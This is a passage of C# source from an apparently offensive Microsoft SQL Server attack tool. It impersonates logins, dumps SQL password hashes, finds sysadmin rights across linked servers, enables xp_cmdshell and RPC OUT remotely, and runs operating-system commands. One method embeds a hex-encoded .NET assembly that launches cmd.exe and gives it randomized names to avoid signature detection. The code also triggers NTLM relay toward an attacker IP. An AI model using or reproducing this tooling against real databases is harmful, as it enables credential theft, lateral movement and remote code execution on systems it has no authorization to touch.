                if (ntlmrelay == true && runmode == 1)
                {
                    Console.WriteLine("################ NTLM Relay on Linked Server #########################");
                    UNCPathInjectionLinked(target, attackerip, con);
                    Console.WriteLine("######################################################################");
                }

                // ====================== LOCAL ENUMERATION ======================
                res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
                Console.Write("[*] User can (explicitly) impersonate the following logins: "); consoletextyellow(); Console.WriteLine(res.Replace("\n", "").Replace("\r", "")); consoletextwhite();
                if ((res.Replace("\n", "").Replace("\r", "")).Equals("")) { Console.WriteLine("-"); }
                if (!(res.Replace("\n", "").Replace("\r", "")).Equals("")) { Console.WriteLine("[i] You should try to 'impersonate' logins with /i:"); }

                try
                {
                    // Print user infos
                    Console.WriteLine("####################### SQL user logins ################################");
                    String un = executeQuery("SELECT USER_NAME();", con);
                    res = executeQuery("SELECT name FROM master.sys.sql_logins;", con);
                    string[] strgs = res.Split(delims, StringSplitOptions.RemoveEmptyEntries);
                    Console.WriteLine("[*] Found following logins:");
                    foreach (string str in strgs)
                    {
                        if (!str.Contains("#"))
                        {
                            Console.WriteLine(str);
                        }
                    }
                    Console.WriteLine("[i] An admin user could try to impersonate these logins");

                    if (impersonate == true)
                    {
                        Console.WriteLine("################## Performing user impersonation #######################");
                        res = executeQuery("EXECUTE AS LOGIN = '" + EscapeSql(usertoimpersonate) + "';", con);
                        res = res.TrimEnd('\r', '\n');
                        Console.WriteLine($"[*] Triggered impersonation.");
                        su = executeQuery("SELECT SYSTEM_USER;", con);
                        su = su.TrimEnd('\r', '\n');
                        un = executeQuery("SELECT USER_NAME();", con);
                        un = un.TrimEnd('\r', '\n');
                        Console.Write($"[*] Current database login is "); consoletextcyan(); Console.Write($"'{su}'"); consoletextwhite(); Console.WriteLine($" with system user '{un}'");
                        getGroupMembership("sysadmin", con);
                        consoletextcyan(); Console.WriteLine("[!] ATTENTION: All following tasks are run as impersonated user!"); consoletextwhite();
                    }
                }
                catch (Exception e1) { Console.WriteLine("No user to impersonate - No permission"); }

                // ====================== HASH DUMP ======================
                if (dumphashes == true)
                {
                    Console.WriteLine("################## Dumping SQL user hashes ############################");
                    if (currentuserisadmin(con) == true)
                    {
                        Console.WriteLine("[*] Let's dump some SQL user hashes on entry SQL server");
                        String reshash = executeQuery($"SELECT CONCAT(name, ':0x', CONVERT(varchar(max), CONVERT(varbinary(max), password_hash), 2)) AS combined_info FROM sys.sql_logins;", con);
                        string[] strgs = reshash.Split(delims, StringSplitOptions.RemoveEmptyEntries);
                        foreach (string str in strgs)
                        {
                            if (!str.Contains("#"))
                            {
                                Console.WriteLine(str);
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Current user has no permission to dump SQL user hashes on entry SQL server");
                    }
                }

                // ====================== LINKED SERVERS ======================
                Console.WriteLine("####################### Linked Servers #################################");
                res = executeQuery("EXEC sp_linkedservers;", con);
                Console.WriteLine($"[*] Found linked servers:\n{res}");
                string[] lservers = res.Split(delims, StringSplitOptions.RemoveEmptyEntries);
                Console.WriteLine("------------------------------------------------------------------");
                Console.WriteLine("Checking permission of single/double/triple link");
                String[] values = null;
                foreach (String lserver in lservers)
                {
                    if (lserver.Contains("\\"))
                    {
                        values = lserver.Split('\\');
                        selfservname = values[0];
                    }
                }
                if (values != null) Console.WriteLine("Entry SQL server: " + values[0]);
                Console.WriteLine("");

                foreach (String lserver in lservers)
                {
                    bool errorfirstlserver = true;
                    bool errorsecondlserver = true;

                    if (lserver.Contains("\\")) { continue; }
                    Console.WriteLine("Scenario: " + selfservname + "-->" + lserver + "-->" + selfservname + "-->" + lserver);

                    try
                    {
                        su = executeQuery("SELECT SYSTEM_USER;", con);
                        su = su.TrimEnd('\r', '\n');
                        Console.WriteLine($"[*] Current system user is '{su}' on entry SQL server ");
                    }
                    catch (Exception e2) { Console.WriteLine("[-] Error while checking local user"); }

                    // 1-hop
                    try
                    {
                        su = executeQuery("select mylogin from openquery([" + lserver + "], 'select SYSTEM_USER as mylogin');", con);
                        su = su.TrimEnd('\r', '\n');
                        Console.Write($"[*] This system user is '{su}' on " + lserver + " (via 1 link). ");
                        errorfirstlserver = false;
                    }
                    catch (Exception e2)
                    {
                        Console.Write("[-] Error while checking user on first link");
                    }

                    if (errorfirstlserver == false)
                    {
                        try
                        {
                            res = executeQuery("EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'');') AT [" + lserver + "];", con);
                            int role = int.Parse(res);
                            if (role == 1)
                            {
                                consoletextyellow(); Console.Write($"(User is in sysadmin group - Pwn3d!)\n"); consoletextwhite();

                                if (dumphashes == true)
                                {
                                    Console.WriteLine("[*] Let's dump some SQL user hashes on " + lserver);
                                    String dumphashesonlserver = $"SELECT CONCAT(name, ':0x', CONVERT(varchar(max), CONVERT(varbinary(max), password_hash), 2)) AS combined_info FROM sys.sql_logins;";
                                    if (dumphashesonlserver.Contains("'")) { dumphashesonlserver = dumphashesonlserver.Replace("'", "''"); }
                                    String reshashlserver1 = executeQuery("EXEC ('" + dumphashesonlserver + ";') AT [" + lserver + "];", con);
                                    string[] strgs = reshashlserver1.Split(delims, StringSplitOptions.RemoveEmptyEntries);
                                    foreach (string str in strgs) { if (!str.Contains("#")) { Console.WriteLine(str); } }
                                }
                            }
                            else { Console.Write("\n"); }
                        }
                        catch (Exception e2) { consoletextgray(); Console.WriteLine("RPC OUT seems to be disabled"); consoletextwhite(); }
                    }

                    // 2-hop
                    try
                    {
                        su = executeQuery("select mylogin from openquery([" + lserver + "], 'select mylogin from openquery([" + selfservname + "], ''select SYSTEM_USER as mylogin'')');", con);
                        su = su.TrimEnd('\r', '\n');
                        Console.Write($"[*] This system user is '{su}' on '" + selfservname + "' (via 2 links). ");
                        errorsecondlserver = false;
                    }
                    catch (Exception e2) { Console.WriteLine("\n[-] Error while checking user on double link"); }

                    if (errorsecondlserver == false)
                    {
                        try
                        {
                            res = executeQuery("EXEC ('EXEC (''SELECT IS_SRVROLEMEMBER(''''sysadmin'''');'') AT [" + selfservname + "]') AT [" + lserver + "];", con);
                            int role = int.Parse(res);
                            if (role == 1) { consoletextyellow(); Console.Write($"(User is in sysadmin group - Pwn3d!)\n"); consoletextwhite(); } else { Console.Write("\n"); }
                        }
                        catch (Exception e2) { consoletextgray(); Console.WriteLine("RPC OUT seems to be disabled"); consoletextwhite(); }
                    }

                    // 3-hop
                    try
                    {
                        res = executeQuery("EXEC ('EXEC (''EXEC (''''SELECT SYSTEM_USER;'''') AT [" + lserver + "]'') AT [" + selfservname + "]') AT [" + lserver + "];", con);
                        Console.Write($"[*] This system user is '" + res.Replace("\n", "").Replace("\r", "") + "' on '" + lserver + "' (via 3 links). ");
                    }
                    catch (Exception e2) { Console.WriteLine("[-] Error while checking user on triple link"); }

                    try
                    {
                        res = executeQuery("EXEC ('EXEC (''EXEC (''''SELECT IS_SRVROLEMEMBER(''''''''sysadmin'''''''');'''') AT [" + lserver + "]'') AT [" + selfservname + "]') AT [" + lserver + "];", con);
                        int role = int.Parse(res);
                        if (role == 1) { consoletextyellow(); Console.Write($"(User is in sysadmin group - Pwn3d!)"); consoletextwhite(); } else { Console.Write("\n"); }
                    }
                    catch (Exception e2) { Console.WriteLine(""); }

                    Console.WriteLine("");
                }

                // ====================== DOUBLE LINK EXEC ======================
                if (executexpcmdshellcommanddoublelink == true)
                {
                    Console.WriteLine("######################## Execute xp_cmdshell double link command - code exec on entry server ###########################");

                    bool x = false;
                    bool error = false;
                    string preparedCmd = PrepareCommand(commandtorun);

                    Console.WriteLine("[*] Checking if RPC OUT is enabled for " + selfservname + " in configuration of linked server " + target);

                    try { x = isRPCOUTenabledlinkedserver(target, selfservname, con); } catch (Exception e0) { Console.WriteLine("[-] Error - Missing permissions to check RPC OUT status"); error = true; }

                    if (!error)
                    {
                        if (!x)
                        {
                            Console.WriteLine("[-] RPC OUT on " + target + " is disabled for linked server " + selfservname);
                        }
                        else
                        {
                            Console.WriteLine("[+] RPC OUT on " + target + " is enabled for linked server " + selfservname);
                        }

                        if (!x)
                        {
                            Console.WriteLine("[*] Trying to enable RPC OUT on " + target + " for linked server " + selfservname);
                            try { enableRPCOUTlinkedserver(target, selfservname, con); } catch (Exception e3) { Console.WriteLine("[-] Error while enabling RPC OUT - Missing permissions"); }

                            x = isRPCOUTenabledlinkedserver(target, selfservname, con);
                            if (x) { Console.WriteLine("[+] RPC OUT is now enabled!"); } else { Console.WriteLine("[-] Could not enable RPC OUT"); }
                        }

                        try
                        {
                            Console.WriteLine("[i] Let me check the xp_cmdshell status on " + selfservname + " via double link.");

                            String res2 = executeQuery("EXEC ('EXEC (''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM  sys.configurations WHERE  name = ''''xp_cmdshell'''';'') AT [" + selfservname + "]') AT [" + target + "];", con);
                            Int32 xp_cmdshell_status = Int32.Parse(res2.ToString());
                            if (xp_cmdshell_status == 1) { Console.WriteLine("[*] xp_cmdshell on entry server is enabled! ;)"); }
                            else
                            {
                                Console.WriteLine("[-] xp_cmdshell on entry server is NOT enabled."); Console.WriteLine("[i] Trying to enable it...");
                                try
                                {
                                    res2 = executeQuery("EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [" + selfservname + "]') AT [" + target + "];", con);
                                    res2 = executeQuery("EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [" + selfservname + "]') AT [" + target + "];", con);
                                    res2 = executeQuery("EXEC ('EXEC (''xp_cmdshell ''''" + EscapeSql(EscapeSql(preparedCmd)) + "'''''') AT [" + selfservname + "]') AT [" + target + "];", con);
                                    Console.WriteLine("[i] Let me check if the xp_cmdshell is now enabled on " + selfservname);
                                    res2 = executeQuery("EXEC ('EXEC (''SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM  sys.configurations WHERE  name = ''''xp_cmdshell'''';'') AT [" + selfservname + "]') AT [" + target + "];", con);
                                    xp_cmdshell_status = Int32.Parse(res2.ToString());
                                    if (xp_cmdshell_status == 1)
                                    {
                                        Console.WriteLine("[*] xp_cmdshell on entry server is now enabled! ;)");
                                    }
                                    else
                                    {
                                        Console.WriteLine("[-] Could not enable xp_cmdshell on " + selfservname);
                                    }
                                }
                                catch (Exception e2)
                                {
                                    Console.WriteLine("[-] Error while enabling xp_cmdshell - Missing permissions");
                                }
                            }
                            res2 = executeQuery("EXEC ('EXEC (''xp_cmdshell ''''" + EscapeSql(EscapeSql(preparedCmd)) + "'''''') AT [" + selfservname + "]') AT [" + target + "];", con);
                            Console.WriteLine($"[*] Triggered command. Result:\n{res2}");
                        }
                        catch (Exception e3)
                        {
                            Console.WriteLine("[-] Error while Code Exec - Skipping Priv Esc via double database link");
                        }
                        Console.WriteLine("######################## execute xp_cmdshell double link command - code exec on entry server ###########################");
                    }
                }

                // ====================== ENABLE XP_CMDSHELL ======================
                if (enablexpcmdshell == true)
                {
                    Console.WriteLine("######################## Enable xp_cmdshell ###########################");
                    if (runmode == 0 && !target.Equals(""))
                    {
                        Console.WriteLine("[i] Local mode (0) was used with a linked server - ignoring that - using local target.");
                    }

                    if (runmode == 0)
                    {
                        Int32 xp_cmdshell_status = enablexpcmdshelllocallyandcheck(con);
                        if (xp_cmdshell_status == 1)
                        {
                            Console.WriteLine("[*] SUCCESS - Enabled 'xp_cmdshell' LOCALLY");
                        }
                        else
                        {
                            Console.WriteLine("[-] Failed to enable 'xp_cmdshell' LOCALLY");
                        }
                    }

                    if (runmode == 1)
                    {
                        Console.WriteLine("Trying to enable xp_cmdshell on linked server " + target);
                        try
                        {
                            res = executeQuery("EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [" + target + "];", con);
                            res = executeQuery("EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [" + target + "];", con);

                            res = executeQuery("EXEC('SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS config_value FROM  sys.configurations WHERE  name = ''xp_cmdshell'';')AT [" + target + "];", con);
                            Int32 xp_cmdshell_status = Int32.Parse(res.ToString());
                            if (xp_cmdshell_status == 1)
                            {
                                Console.WriteLine("[*] SUCCESS - Enabled 'xp_cmdshell' on linked server " + target);
                            }
                            else
                            {
                                Console.WriteLine("[-] Failed to enable 'xp_cmdshell' on linked server " + target + " - Missing permissions?");
                            }
                        }
                        catch (Exception e2)
                        {
                            Console.WriteLine(e2);
                            Console.WriteLine("[-] Error - Does the linked server exist?");
                        }
                    }
                    Console.WriteLine("######################## Enable xp_cmdshell ###########################");
                }

                // ====================== OS COMMAND EXECUTION (Unified with technique selector) ======================
                if (executexpcmdshellcommand == true)
                {
                    string preparedCmd = PrepareCommand(commandtorun);

                    // Route to appropriate technique
                    if (cmdExecTechnique == 2)
                    {
                        // sp_OACreate (from SharpSQLPwn technique 2)
                        Console.WriteLine("######################## sp_OACreate command ###########################");
                        if (runmode == 0)
                        {
                            ExecuteOleAutomation(commandtorun, con);
                        }
                        else if (runmode == 1)
                        {
                            ExecuteOleAutomationLinked(commandtorun, target, con);
                        }
                        Console.WriteLine("########################################################################");
                    }
                    else if (cmdExecTechnique == 3)
                    {
                        // CLR Assembly (originally --StoProx, now also via --cmdtech 3)
                        Console.WriteLine("########### Executing command through CLR stored procedure ###############");
                        if (runmode == 0)
                        {
                            ExecuteCLRAssembly(commandtorun, con);
                        }
                        else if (runmode == 1)
                        {
                            Console.WriteLine("[-] CLR Assembly on linked servers is not yet supported. Use --cmdtech 1 or 2 with -l.");
                        }
                        Console.WriteLine("#####################################################################");
                    }
                    else if (cmdExecTechnique == 4)
                    {
                        // sp_execute_external_script (Python)
                        Console.WriteLine("########### Executing via External Script (Python) ###############");
                        if (runmode == 0)
                        {
                            ExecuteExternalScript(commandtorun, con);
                        }
                        else if (runmode == 1)
                        {
                            ExecuteExternalScriptLinked(commandtorun, target, con);
                        }
                        Console.WriteLine("#####################################################################");
                    }
                    else
                    {
                        // Default: xp_cmdshell (technique 1)
                        Console.WriteLine("######################## XP_cmdshell command ###########################");
                        if (runmode == 0)
                        {
                            Int32 xp_cmdshell_status = 0;
                            bool error = false;

                            try { xp_cmdshell_status = isxpcmdshelllocallyenabled(con); }
                            catch (Exception e2) { }

                            if (xp_cmdshell_status == 1)
                            {
                                Console.WriteLine("[+] XP_cmdshell is enabled");
                            }
                            else
                            {
                                Console.WriteLine("[-] XP_cmdshell is disabled");
                                Console.WriteLine("[*] Trying to enable it");
                                try { enablexpcmdshelllocallyandcheck(con); }
                                catch (Exception e2) { Console.WriteLine("[-] Error enabling xp_cmdshell locally - Missing permissions"); error = true; }
                            }

                            if (error == false)
                            {
                                try
                                {
                                    res = executeQuery("EXEC xp_cmdshell '" + EscapeSql(preparedCmd) + "'", con);
                                    Console.WriteLine("[*] Executed command! Result:");
                                    Console.WriteLine(res);

                                    if (cleanupAfterExec && xp_cmdshell_status != 1)
                                    {
                                        disablexpcmdshelllocally(con);
                                    }
                                }
                                catch (Exception e2) { Console.WriteLine("[-] Error - Current user has no permissions to use xp_cmdshell locally"); }
                            }
                        }

                        if (runmode == 1)
                        {
                            bool xpcmdshellenabled = false;
                            Int32 xp_cmdshell_status = 0;
                            try
                            {
                                bool RPCenabled = isRPCOUTenabled(target, con);
                                if (RPCenabled)
                                {
                                    Console.WriteLine("[+] RPC OUT is enabled for linked server " + target);
                                    RPCOUTenabled = true;
                                }

                                if (!RPCenabled)
                                {
                                    Console.WriteLine("[-] RPC OUT is disabled for linked server " + target);
                                    Console.WriteLine("[*] Trying to enable RPC OUT for linked server " + target);
                                    enableRPCFull(target, con);

                                    if (isRPCOUTenabled(target, con))
                                    {
                                        Console.WriteLine("[+] RPC OUT is now enabled for linked server " + target);
                                        RPCOUTenabled = true;
                                    }
                                    if (!isRPCOUTenabled(target, con))
                                    {
                                        Console.WriteLine("[-] Could not enable RPC OUT " + target);
                                    }
                                }
                            }
                            catch (Exception e2) { Console.WriteLine("[-] Error - Missing permissions to enable RPC OUT locally"); }

                            if (isxpcmdshellonlserverenabled(target, con) == 0)
                            {
                                Console.WriteLine("[-] XP_cmdshell disabled on " + target); Console.WriteLine("[*] Trying to enable XP_cmdshell on " + target);
                                xp_cmdshell_status = enablexpcmdshelllserverandcheck(target, con);
                                if (xp_cmdshell_status == 1)
                                {
                                    Console.WriteLine("[+] XP_cmdshell is now enabled on " + target);
                                    xpcmdshellenabled = true;
                                }
                                else
                                {
                                    Console.WriteLine("[-] XP_cmdshell could not be enabled on " + target + "- Missing permissions");
                                }
                            }
                            else { Console.WriteLine("[+] XP_cmdshell enabled on " + target); xpcmdshellenabled = true; }

                            if (RPCOUTenabled == true && xpcmdshellenabled == true)
                            {
                                try
                                {
                                    res = executeQuery("EXEC ('xp_cmdshell ''" + EscapeSql(preparedCmd) + "'';') AT [" + target + "];", con);
                                    Console.WriteLine($"[*] Triggered command. Result: \n{res}");
                                }
                                catch (Exception e2) { Console.WriteLine("[-] Missing permissions - Current user is not allowed to use XP_cmdshell on linked server"); }
                            }
                        }
                        Console.WriteLine("########################################################################");
                    }
                }

                // ====================== SQL SHELL ======================
                if (sqlshell == true)
                {
                    Console.WriteLine("######################## SQLshell command ###########################");
                    if (runmode == 0)
                    {
                        try
                        {
                            res = executeQueryMultiColumn(commandtorun, con);
                            Console.WriteLine("[*] Executed command! Result:");
                            Console.WriteLine(res);
                        }
                        catch (Exception e2) { Console.WriteLine("[-] Error while executing SQL command locally" + e2); }
                    }

                    if (runmode == 1)
                    {
                        try
                        {
                            string escapedCmd = EscapeSql(commandtorun);
                            res = executeQuery("EXEC ('" + escapedCmd + ";') AT [" + target + "];", con);
                            Console.WriteLine($"[*] Triggered command. Result: {res}");
                        }
                        catch (Exception e2)
                        {
                            Console.WriteLine("[-] Error while executing SQL command on linked server " + target);
                        }
                    }
                    Console.WriteLine("######################## SQLshell command ###########################");
                }

                // ====================== CLR Assembly (legacy --StoProx) ======================
                if (stoprox == true)
                {
                    Console.WriteLine("########### Executing command through CLR stored procedure ###############");
                    if (runmode == 0)
                    {
                        ExecuteCLRAssembly(commandtorun, con);
                    }
                    if (runmode == 1)
                    {
                        Console.WriteLine("[-] CLR Assembly on linked servers is not yet supported.");
                    }
                    Console.WriteLine("#####################################################################");
                }

                // ====================== Linked Query via OPENQUERY (from SharpSQLPwn) ======================
                if (linkedQuery != null && runmode == 1)
                {
                    Console.WriteLine("################ Linked Server Custom Query ##########################");
                    try
                    {
                        consoletextcyan();
                        Console.WriteLine("[*] Running custom query on " + target + " via OPENQUERY...");
                        consoletextwhite();
                        string oqQuery = "SELECT * FROM OPENQUERY([" + target + "], '" + EscapeSql(linkedQuery) + "')";
                        res = executeQueryMultiColumn(oqQuery, con);
                        Console.WriteLine("[*] Result:");
                        Console.WriteLine(res);
                    }
                    catch (Exception e2)
                    {
                        consoletextred();
                        Console.WriteLine("[-] Error executing query on linked server: " + e2.Message);
                        consoletextwhite();
                    }
                    Console.WriteLine("######################################################################");
                }
            }

            FinalizeLogging();
        }

        // --- CLR Assembly Execution (extracted from original stoprox logic) ---

        public static void ExecuteCLRAssembly(string command, SqlConnection con)
        {
            // OPSEC: Randomize assembly and procedure names to avoid static signature detection
            string asmName = GenerateRandomName(10);
            string procName = GenerateRandomName(8);

            string preparedCmd = PrepareCommand(command);
            if (!quietMode)
            {
                consoletextcyan();
                Console.WriteLine("[i] OPSEC: Using randomized CLR names - Assembly: " + asmName + ", Procedure: " + procName);
                consoletextwhite();
            }
            try
            {
                string res;
                res = executeQuery("use msdb; EXECUTE AS USER = 'dbo'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;", con);
                res = executeQuery("use msdb; EXECUTE AS USER = 'dbo'; EXEC sp_configure 'clr enabled',1; RECONFIGURE;", con);
                res = executeQuery("use msdb; EXECUTE AS USER = 'dbo'; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;", con);
                try { res = executeQuery("EXECUTE AS USER = 'dbo';DROP PROCEDURE dbo.[" + procName + "];DROP ASSEMBLY [" + asmName + "];", con); } catch (Exception ex1) { }
                res = executeQuery("CREATE ASSEMBLY [" + asmName + "] FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A240000000000000050450000648602006F5D02EA0000000000000000F00022200B023000000C00000004000000000000000000000020000000000080010000000020000000020000040000000000000006000000000000000060000000020000000000000300608500004000000000000040000000000000000010000000000000200000000000000000000010000000000000000000000000000000000000000040000098030000000000000000000000000000000000000000000000000000FC290000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000C20A000000200000000C000000020000000000000000000000000000200000602E72737263000000980300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000E8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D170000012516724B0000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300000404000023537472696E677300000000280700005C0000002355530084070000100000002347554944000000940700005401000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F0000000100000001000000030000000000640201000000000006008E0118030600FB0118030600AC00E6020F00380300000600D4007C02060071017C02060052017C020600E2017C020600AE017C020600C7017C02060001017C020600C000F90206009E00F902060035017C0206001C012D0206008A0375020A00EB00C5020A00470247030E006D03E6020A006200C5020E009C02E60206005D0275020A002000C5020A008E0014000A00DC03C5020A008600C5020600AD020A000600BA020A000000000001000000000001000100010010005C03000041000100010048200000000096003500620001000921000000008618E002060002000000010056000900E00201001100E00206001900E0020A002900E00210003100E00210003900E00210004100E00210004900E00210005100E00210005900E00210006100E00215006900E00210007100E00210007900E00210008900E00206009900E002060099008E022100A90070001000B10083032600A90075031000A90019021500A900C10315009900A8032C00B900E0023000A100E0023800C9007D003F00D1009D0344009900AE034A00E1003D004F00810051024F00A1005A025300D100E7034400D100470006009900910306009900980006008100E002060020007B004E012E000B0068002E00130071002E001B0090002E00230099002E002B00AB002E003300AB002E003B00AB002E00430099002E004B00B1002E005300AB002E005B00AB002E006300C9002E006B00F3002E00730000011A00048000000100000000000000000000000000F603000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059007502000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E67006D7373716C2D62696E6172792E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F77006D7373716C2D62696E6172790000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500001120002F00430020007B0030007D002000000D6F007500740070007500740000000000BA3B672D46F6EF4E8E6D85464A700F1800042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001101000C6D7373716C2D62696E617279000005010000000017010012436F7079726967687420C2A920203230323200002901002466643162653231362D613737652D343264342D613932662D33666535313536616331373800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E320401000000000000000061E961E700000000020000008E000000342A0000340C0000000000000000000000000000100000000000000000000000000000005253445398C638FABD4E3349B55E200EEAB16ABC01000000433A5C55736572735C757365725C4465736B746F705C4D5353514C202D2053746F72656450726F6365647572652D437573746F6D42696E6172795C6D7373716C2D62696E6172795C6D7373716C2D62696E6172795C6F626A5C7836345C52656C656173655C6D7373716C2D62696E6172792E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000003C03000000000000000000003C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0049C020000010053007400720069006E006700460069006C00650049006E0066006F0000007802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D006500000000000000000042000D000100460069006C0065004400650073006300720069007000740069006F006E00000000006D007300730071006C002D00620069006E0061007200790000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000042001100010049006E007400650072006E0061006C004E0061006D00650000006D007300730071006C002D00620069006E006100720079002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000004A00110001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006D007300730071006C002D00620069006E006100720079002E0064006C006C00000000003A000D000100500072006F0064007500630074004E0061006D006500000000006D007300730071006C002D00620069006E0061007200790000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;", con);
                res = executeQuery("CREATE PROCEDURE [dbo].[" + procName + "] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [" + asmName + "].[StoredProcedures].[cmdExec];", con);

                res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';EXEC [" + procName + "] '" + EscapeSql(preparedCmd) + "'", con);
                Console.WriteLine("[*] Executed command! Result:");
                Console.WriteLine(res);

                if (cleanupAfterExec)
                {
                    consoletextcyan();
                    Console.WriteLine("[*] Cleanup: Dropping procedure and assembly...");
                    consoletextwhite();
                    try { executeQuery("EXECUTE AS USER = 'dbo';DROP PROCEDURE dbo.[" + procName + "];", con); } catch { }
                    try { executeQuery("EXECUTE AS USER = 'dbo';DROP ASSEMBLY [" + asmName + "];", con); } catch { }
                    try { executeQuery("use msdb; EXEC sp_configure 'clr strict security',1; RECONFIGURE; EXEC sp_configure 'clr enabled',0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;", con); } catch { }
                }
            }
            catch (Exception e2)
            {
                consoletextred();
                Console.WriteLine("[-] Error while executing CLR stored procedure - No permission: " + e2.Message);
                consoletextwhite();
            }
        }
    }
}
